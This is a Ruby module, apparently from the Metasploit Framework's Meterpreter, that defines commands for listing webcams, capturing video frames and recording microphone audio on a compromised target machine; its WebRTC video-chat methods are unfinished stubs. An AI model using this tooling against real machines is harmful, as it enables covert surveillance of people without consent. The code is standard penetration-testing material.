# -*- coding: binary -*-

module Rex
module Post
module Meterpreter
module Extensions
module Stdapi
module Webcam

###
#
# This meterpreter extension can list and capture from webcams and/or microphone
#
###
class Webcam

  def initialize(client)
    @client = client
  end

  def webcam_list
    response = client.send_request(Packet.create_request('webcam_list'))
    names = []
    response.get_tlvs( TLV_TYPE_WEBCAM_NAME ).each{ |tlv|
      names << tlv.value
    }
    names
  end

  # Starts recording video from video source of index +cam+
  def webcam_start(cam)
    request = Packet.create_request('webcam_start')
    request.add_tlv(TLV_TYPE_WEBCAM_INTERFACE_ID, cam)
    client.send_request(request)
    true
  end

  def webcam_get_frame(quality)
    request = Packet.create_request('webcam_get_frame')
    request.add_tlv(TLV_TYPE_WEBCAM_QUALITY, quality)
    response = client.send_request(request)
    response.get_tlv( TLV_TYPE_WEBCAM_IMAGE ).value
  end

  def webcam_stop
    client.send_request( Packet.create_request( 'webcam_stop' )  )
    true
  end

  def webcam_chat
    offerer_id = 'sinn3r_offer'
    remote_browser_path = find_remote_webrtc_browser
    local_browser_path  = find_local_webrtc_browser
    init_video_chat(local_browser_path, offerer_id)
    connect_video_chat(offerer_id)
  end

  # Record from default audio source for +duration+ seconds;
  # returns a low-quality wav file
  def record_mic(duration)
    request = Packet.create_request('webcam_audio_record')
    request.add_tlv(TLV_TYPE_AUDIO_DURATION, duration)
    response = client.send_request(request)
    response.get_tlv( TLV_TYPE_AUDIO_DATA ).value
  end

  attr_accessor :client


  private


  def find_remote_webrtc_browser
    puts "Looking for a web browser on the target machine that supports WebRTC..."
    ''
  end


  def find_local_webrtc_browser
    puts "Looking for a web browser on the local machine that supports WebRTC..."
    ''
  end


  def init_video_chat(local_browser_path, offerer_id, httpserver_port=8080)
    interface = load_interface('offerer.html')
    api       = load_api_code
  end


  def connect_video_chat(offerer_id)
    interface = load_interface('answerer.html')
    api       = load_api_code
  end

  def load_interface(html_name)
    interface_path = File.join(Msf::Config.data_directory, 'webcam', html_name)
    interface_code = ''
    File.open(interface_path) { |f| interface_code = f.read }
    interface_code
  end

  def load_api_code
    js_api_path = File.join(Msf::Config.data_directory, 'webcam', 'api.js')
    api = ''
    File.open(js_api_path) { |f| api = f.read }
    api
  end

end

end; end; end; end; end; end
